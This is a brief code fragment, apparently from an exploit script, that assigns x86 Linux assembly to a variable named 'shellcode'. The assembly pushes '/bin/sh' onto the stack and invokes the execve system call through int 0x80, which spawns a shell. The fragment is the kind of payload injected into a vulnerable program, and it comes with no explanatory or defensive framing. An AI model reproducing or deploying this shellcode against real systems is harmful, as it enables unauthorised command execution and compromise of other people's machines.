shellcode = 
	'''
        xor edx, edx
        xor ecx, ecx
        push 0x68732f
        push 0x6e69622f
        mov ebx, esp
        mov al, 0xb
        int 0x80
    '''